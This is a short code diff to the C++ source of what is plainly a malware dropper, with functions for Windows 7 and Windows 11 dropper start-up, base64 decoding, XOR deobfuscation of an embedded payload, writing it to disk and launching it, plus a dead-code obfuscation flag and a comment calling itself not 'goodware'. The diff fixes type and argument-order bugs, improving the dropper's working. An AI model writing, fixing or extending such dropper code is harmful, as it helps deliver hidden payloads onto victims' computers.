@@ -51,8 +51,8 @@ void dead();
 std::uint64_t check_version();
 void w7_dropper_start();
 void w11_dropper_start();
-void drop(int size, void* buffer, std::string);
-void* XOR(void* data, int size);
+void drop(DWORD size, void* buffer, std::string);
+void* XOR(void* data, DWORD size);
 void* base64decode(void* data, DWORD* size);
 void launch(std::string);
 void set_name(std::uint64_t);
@@ -208,7 +208,7 @@ int main(int argc, char* argv[])
 		data1 = XOR(data1, size1);
 	#endif
 
-		drop(data1, size1, name1);
+		drop(size1, data1, name1);
 
 		launch(name1);
 #ifdef DEAD_CODE
@@ -476,7 +476,7 @@ void* base64decode(void* data, DWORD* size)
 
 
 // XOR bytes in the buffer with a key
-void* XOR(void* data, int size) {
+void* XOR(void* data, DWORD size) {
 	// auxiliary buffer
 	// this is never freed, but ok, i'm not a goodware anyway
 	void* buffer = malloc(size);
@@ -491,7 +491,7 @@ void* XOR(void* data, int size) {
 }
 
 // Drop buffer to file
-void drop(int size, void* buffer, std::string drop_name)
+void drop(DWORD size, void* buffer, std::string drop_name)
 {
 	const char* test = drop_name.c_str();
 	printf("%s\n", test);
